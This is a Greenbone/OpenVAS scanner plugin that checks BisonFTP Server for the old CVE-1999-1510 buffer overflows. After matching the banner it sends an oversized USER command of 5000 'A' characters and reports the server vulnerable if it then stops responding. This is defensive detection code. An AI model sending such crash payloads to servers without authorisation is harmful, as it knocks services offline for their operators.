# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802033");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)");
  script_cve_id("CVE-1999-1510");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("BisonFTP Multiple Commands Remote Buffer Overflow Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/bisonware/bisonftp/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17649");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/271");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49109");
  script_xref(name:"URL", value:"http://marc.info/?l=ntbugtraq&m=92697301706956&w=2");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary code
  on the system or cause the application to crash.");

  script_tag(name:"affected", value:"BisonFTP Server prior to version 4.1.");

  script_tag(name:"insight", value:"The flaws are due to an error while processing the 'USER', 'LIST',
  'CWD' multiple commands, which can be exploited to cause a buffer overflow
  by sending a command with specially-crafted an overly long parameter.");

  script_tag(name:"solution", value:"Upgrade to BisonFTP Server Version 4.1 or higher.");

  script_tag(name:"summary", value:"BisonFTP Server is prone to multiple buffer overflow vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "BisonWare BisonFTP server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

resp = ftp_recv_line(socket:soc);
if(!resp || "BisonWare BisonFTP server" >!< resp){
  ftp_close(socket:soc);
  exit(0);
}

attackReq = crap(data: "A", length: 5000);

attack = string("USER ", attackReq, "\r\n");
send(socket:soc, data:attack);
send(socket:soc, data:attack);
resp = recv(socket:soc, length:1024);
ftp_close(socket:soc);

soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  security_message(port:ftpPort);
  exit(0);
}

resp = recv(socket:soc1, length:1024);
ftp_close(socket:soc1);

if(!resp || "BisonWare BisonFTP server" >!< resp){
  security_message(port:ftpPort);
  exit(0);
}
